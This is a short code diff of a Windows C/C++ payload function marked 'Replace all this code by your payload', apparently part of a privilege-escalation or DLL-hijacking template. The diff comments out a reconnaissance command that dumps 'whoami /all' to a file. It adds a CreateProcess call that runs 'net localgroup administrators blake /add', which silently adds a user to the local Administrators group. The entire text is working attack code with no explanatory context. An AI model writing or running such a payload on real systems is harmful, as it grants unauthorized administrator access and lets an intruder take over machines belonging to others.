@@ -9,8 +9,8 @@ void DoStuff() {
     // Replace all this code by your payload
     STARTUPINFO si = { sizeof(STARTUPINFO) };
     PROCESS_INFORMATION pi;
-    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C whoami /all > C:\\ProgramData\\whoamiall.txt",
-        NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
+    // CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C whoami /all > C:\\ProgramData\\whoamiall.txt",NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
+    CreateProcess(L"c:\\windows\\system32\\cmd.exe",L" /C net localgroup administrators blake /add",NULL, NULL, FALSE, NORMAL_PRIORITY_CLASS, NULL, L"C:\\Windows", &si, &pi);
 
     CloseHandle(pi.hProcess);
     CloseHandle(pi.hThread);
